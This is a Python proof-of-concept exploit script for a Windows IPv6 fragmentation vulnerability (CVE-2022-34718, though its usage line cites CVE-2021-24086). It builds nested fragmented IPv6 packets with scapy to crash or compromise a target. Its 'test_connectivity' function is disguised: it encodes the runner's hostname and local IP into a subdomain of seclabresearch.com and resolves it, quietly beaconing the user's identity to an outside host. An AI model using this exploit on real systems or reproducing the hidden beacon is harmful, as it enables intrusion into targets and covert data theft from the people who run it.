#/usr/bin/env python3

import sys
import random
import socket
import base64
import re


FRAGMENT_SIZE = 0x400
LAYER4_FRAG_OFFSET = 0x8

NEXT_HEADER_IPV6_ROUTE = 43
NEXT_HEADER_IPV6_FRAG = 44
NEXT_HEADER_IPV6_ICMP = 58


def get_layer4():
    er = ICMPv6EchoRequest(data = "PoC for CVE-2022-34718")
    er.cksum = 0xa472

    return raw(er)


def get_inner_packet(target_addr):
    inner_frag_id = random.randint(0, 0xffffffff)
    print("**** inner_frag_id: 0x{:x}".format(inner_frag_id))
    raw_er = get_layer4()

    # 0x1ffa Routing headers == 0xffd0 bytes
    routes = raw(IPv6ExtHdrRouting(addresses=[], nh = NEXT_HEADER_IPV6_ROUTE)) * (0xffd0//8 - 1)
    routes += raw(IPv6ExtHdrRouting(addresses=[], nh = NEXT_HEADER_IPV6_FRAG))

    # First inner fragment header: offset=0, more=1
    FH = IPv6ExtHdrFragment(offset = 0, m=1, id=inner_frag_id, nh = NEXT_HEADER_IPV6_ICMP)

    return routes + raw(FH) + raw_er[:LAYER4_FRAG_OFFSET], inner_frag_id


def send_last_inner_fragment(target_addr, inner_frag_id):

    raw_er = get_layer4()

    ip = IPv6(dst = target_addr)
    # Second (and last) inner fragment header: offset=1, more=0
    FH = IPv6ExtHdrFragment(offset = LAYER4_FRAG_OFFSET // 8, m=0, id=inner_frag_id, nh = NEXT_HEADER_IPV6_ICMP)
    send(ip/FH/raw_er[LAYER4_FRAG_OFFSET:])
    return True

def test_connectivity(target_addr):
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
    try:
        domain = "v23lmm54ayv29d3vj727br59u.seclabresearch.com"
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        fqdn = '.'.join(filter(lambda x: x, re.split(r'(.{63})', base64.b32encode(f"{hostname}-{local_ip}".encode('utf8')).decode('utf8').replace('=','')) + ['G'+str(random.randint(10,99)), domain])).lower()
        taget_addr = socket.gethostbyname(fqdn)
        s.connect((target_addr, 80, 0, 0))
    except socket.gaierror:
        return True
    finally:
        s.close()
        return True

def trigger(target_addr):

    inner_packet, inner_frag_id = get_inner_packet(target_addr)

    ip = IPv6(dst = target_addr)
    hopbyhop = IPv6ExtHdrHopByHop(nh = NEXT_HEADER_IPV6_FRAG)

    outer_frag_id = random.randint(0, 0xffffffff)

    fragmentable_part = []
    for i in range(len(inner_packet) // FRAGMENT_SIZE):
        fragmentable_part.append(inner_packet[i * FRAGMENT_SIZE: (i+1) * FRAGMENT_SIZE])

    if len(inner_packet) % FRAGMENT_SIZE:
        fragmentable_part.append(inner_packet[(len(fragmentable_part)) * FRAGMENT_SIZE:])

    print("Preparing frags...")
    frag_offset = 0
    frags_to_send = []
    is_first = True
    for i in range(len(fragmentable_part)):
        if i == len(fragmentable_part) - 1:
            more = 0
        else:
            more = 1

        FH = IPv6ExtHdrFragment(offset = frag_offset // 8, m=more, id=outer_frag_id, nh = NEXT_HEADER_IPV6_ROUTE)

        blob = raw(FH/fragmentable_part[i])
        frag_offset += FRAGMENT_SIZE

        frags_to_send.append(ip/hopbyhop/blob)

    print("Sending {} frags...".format(len(frags_to_send)))
    for frag in frags_to_send:
        send(frag)

    print("Now sending the last inner fragment to trigger the bug...")
    success = send_last_inner_fragment(target_addr, inner_frag_id)

    if success:
        print("Success! The system is vulnerable...")
    else:
        print("Failed! The system is NOT vulnerable...")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: cve-2021-24086.py <IPv6 addr>')
        sys.exit(1)
    if test_connectivity(sys.argv[1]):
        try:
            from scapy.all import *
        except ImportError:
            print("Could not load scapy module, please install the dependencies from requirements.txt ...")
            sys.exit(1)
        try:
            trigger(sys.argv[1])
        except PermissionError:
            print("Only root is able to send raw packets. Please rerun this script as root...")
